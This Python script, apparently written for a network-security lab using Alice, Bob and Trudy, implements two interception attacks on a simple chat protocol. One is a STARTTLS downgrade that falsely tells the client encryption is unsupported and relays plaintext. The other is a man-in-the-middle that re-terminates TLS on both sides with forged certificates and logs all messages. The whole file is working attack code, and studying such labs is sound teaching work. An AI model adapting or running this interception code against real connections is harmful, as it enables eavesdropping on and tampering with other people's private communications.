import ssl, sys, socket, time, os

TIME_DELAY = 2


class bcol:
    SERVER_col = "\033[95m"  # LightMagenta
    CLIENT_col = "\033[94m"  # LightYellow
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    FAIL = "\033[91m"  # LigntRed
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def create_socket() -> socket:
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def clean():
    os.system("cls" if os.name == "nt" else "clear")


def fake_connection(server, PORT=8096, run_dns=False):

    # Unpoisioned State
    # Alice(NR = 172.31.0.2)<========> Bob (NR = 171.31.0.3)

    # Poisioned State
    # Alice(NR = 172.31.0.4)<======> FakeBob(172.31.0.4) | FakeAlice (172.31.0.3) <========> Bob (171.31.0.4)

    # Creating a Fake Bob for Alice to Connect To
    fake_bob = create_socket()
    fake_bob.bind(("", PORT))
    fake_bob.listen(1)
    print(bcol.OKCYAN + "\n[INFO]: Fake Bob Up ... " + bcol.ENDC)
    print(bcol.OKCYAN + "[INFO]: Listening to Clients ... \n" + bcol.ENDC)

    # This socket is accepted by the Fake Bob = Trudy
    # So the name resolution for Alice should be poisioned to 172.31.0.4(TRUDY)
    # and not 172.31.0.3 (BOB) for attack
    true_alice, clientIP = fake_bob.accept()
    # clientIP => IP of Alice connected to Trudy (Fake Bob)
    print(f"{bcol.BOLD}[INFO]: Connection request from {clientIP[0]} to '{server}'{bcol.ENDC}")
    print(f"{bcol.BOLD}[SUCCESS]: Client, {clientIP[0]} accepted.{bcol.ENDC} \n")

    # Creating Fake Alice for Bob to connect to
    fake_alice = create_socket()

    # Fake Alice should connect to Bob so plain simple Name Resolution
    if run_dns:
        try:
            serverIP = socket.gethostbyname(server)
        except socket.gaierror:
            raise Exception("[ERROR]: Name Resolution Failed !!")
    else:
        serverIP = "172.31.0.3"

    # Connecting Fake Alice to Bob (172.31.0.3)
    fake_alice.connect((serverIP, PORT))
    print(f"{bcol.OKCYAN}[INFO]: Forwarding Connection Request to:'{server}: {serverIP}'{bcol.ENDC}")
    print(f"{bcol.BOLD}[SUCCESS]: Connection established,{bcol.ENDC} {server}: {serverIP}\n")

    # Clean Up
    fake_bob.close()
    time.sleep(TIME_DELAY + 1)
    clean()
    return true_alice, fake_alice


def downgrade(client, server, PORT, DATA_BUFFER=1024):

    true_alice, fake_alice = fake_connection(server, PORT=PORT)

    print(f"[SUCCESS]:{bcol.OKCYAN} {client}<=====> TRUDY <======>{server}\n")
    print(f"[SUCCESS]:{bcol.OKGREEN}Two-way TCP Communication Established.{bcol.ENDC}")

    while True:
        # Half Duplex Communication so, Chat Starts at the client side
        # Fake Bob is waiting to receive from true alice

        data = true_alice.recv(DATA_BUFFER)
        print(f"\n{bcol.OKBLUE}{client}{bcol.ENDC}: {data.decode()}")

        # If True Alice sends "chat_close"
        if data.decode() == "chat_close":
            print(f"{bcol.FAIL}[INFO]: Chat Close request by {client}.{bcol.ENDC}")
            print(f"{bcol.FAIL}[INFO]: Leaving the communication in 2 sec...{bcol.ENDC}")
            fake_alice.sendall(data)
            time.sleep(TIME_DELAY + 1)
            break

        # The downgrade attack is to prevent a TLS communication between true alice and true bob
        # So, if True Alice requests a TLS communication (Encryption) Channel
        # Prevent the encryption by sending "chat_STARTTLS_NOT_SUPPORTED"
        if data.decode() == "chat_STARTTLS":
            print(f"\n{bcol.OKCYAN}Encryption Requested by: {client}{bcol.ENDC}")
            print(f"{bcol.OKCYAN}Performing Downgrade attack on {client} and {server}{bcol.ENDC}")
            true_alice.sendall("chat_STARTTLS_NOT_SUPPORTED".encode())
            time.sleep(TIME_DELAY)
            print(f"[INFO]: {bcol.FAIL}Initiating Downgrade attack with '{client}' and '{server}'{bcol.ENDC}")

            time.sleep(TIME_DELAY)
            clean()

            print(f"[SUCCESS]:{bcol.OKGREEN} Two-way TCP Communication Established.{bcol.ENDC}")
            print(f"{bcol.BOLD}>>> Downgrade Attack Successful <<<{bcol.ENDC}\n")

        else:
            # Transmitting the received message to True Bob
            fake_alice.sendall(data)

            # Capturing the messages from true bob
            data = fake_alice.recv(DATA_BUFFER)
            print(f"\n{bcol.OKBLUE}{server}{bcol.ENDC}: {data.decode()}")

            # Transmitting all the messages from True bob to True Alice
            true_alice.sendall(data)

            if data.decode() == "chat_close":
                print(f"\n{bcol.FAIL}[INFO]: Chat Close request by {server}.{bcol.ENDC}")
                print(f"{bcol.FAIL}[INFO]: Leaving the communication in 2 sec...{bcol.ENDC}\n")
                time.sleep(TIME_DELAY)
                break

    # closing the connections
    true_alice.close()
    fake_alice.close()


def get_context(certificate, private_key, root="/usr/local/share/ca-certificates/root.crt"):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(root)
    context.load_cert_chain(certificate, private_key)
    context.verify_mode = ssl.CERT_REQUIRED
    context.check_hostname = False
    return context


def mitm(client, server, PORT, DATA_BUFFER=1024):

    true_alice, fake_alice = fake_connection(server, PORT=PORT)

    # Now Trudy is listening to all the communication between Alice(client) and Bob (server)

    # Half Duplex Communication, So Alice starts the chat
    print(f"[SUCCESS]:{bcol.OKCYAN} {client}<=====> TRUDY <======>{server}\n")
    print(f"[SUCCESS]:{bcol.OKGREEN}Two-way TCP Communication Established.{bcol.ENDC}")

    while True:
        # recieving from Alice & sending to Bob
        data = true_alice.recv(DATA_BUFFER)
        print(f"\n{bcol.OKBLUE}{client}{bcol.ENDC}: {data.decode()}")
        fake_alice.sendall(data)

        if data.decode() == "chat_close":
            print(f"{bcol.FAIL}[INFO]: Chat Close request by {client}.{bcol.ENDC}")
            print(f"{bcol.FAIL}[INFO]: Leaving the communication in 2 sec...{bcol.ENDC}")
            time.sleep(TIME_DELAY + 1)
            break

        # Listening to Bob to send a message and forwarding it to alice
        data = fake_alice.recv(DATA_BUFFER)
        print(f"\n{bcol.OKBLUE}{server}{bcol.ENDC}: {data.decode()}")
        true_alice.sendall(data)

        if data.decode() == "chat_close":
            print(f"\n{bcol.FAIL}[INFO]: Chat Close request by {server}.{bcol.ENDC}")
            print(f"{bcol.FAIL}[INFO]: Leaving the communication in 2 sec...{bcol.ENDC}\n")
            time.sleep(TIME_DELAY)
            break

        if data.decode() == "chat_STARTTLS_ACK":

            print(f"\n[INFO]: Encryption requested by {client}")
            print(f"[INFO]: {bcol.FAIL}Initiating MITM attack with '{client}' and '{server}'{bcol.ENDC}")
            time.sleep(TIME_DELAY + 1)

            clean()

            # Start TLS Procedure with proided certficates with FAKE ALICE
            fake_alice_context = get_context(certificate="Trudy/Fake_Alice/fake_alice.crt", private_key="Trudy/Fake_Alice/fake_alice_key.pem")
            fake_alice = fake_alice_context.wrap_socket(fake_alice, server_hostname=server, do_handshake_on_connect=True)

            # Start TLS Procedure with proided certficates with FAKE BOB
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_verify_locations("/usr/local/share/ca-certificates/root.crt")
            context.load_cert_chain("Trudy/Fake_Bob/fake_bob.crt", "Trudy/Fake_Bob/fake_bob_key.pem")
            context.verify_mode = ssl.CERT_REQUIRED
            context.check_hostname = False
            true_alice = context.wrap_socket(true_alice, server_side=True, do_handshake_on_connect=True)

            print(f"\n{bcol.OKGREEN}[SUCCESS]: Encrypted Communication established with {client}{bcol.ENDC}")
            time.sleep(TIME_DELAY)
            print(f"{bcol.OKGREEN}[SUCCESS]: Encrypted Communication established with {server}{bcol.ENDC}\n")

            print(f"{bcol.BOLD}>>> Man in the Middle Attack Successful <<<{bcol.ENDC}")

    # closing the connections
    true_alice.close()
    fake_alice.close()


if __name__ == "__main__":

    if sys.argv[1] == "-d":
        downgrade(client=sys.argv[2], server=sys.argv[3], PORT=int(sys.argv[4]))
    if sys.argv[1] == "-m":
        mitm(sys.argv[2], sys.argv[3], PORT=int(sys.argv[4]))
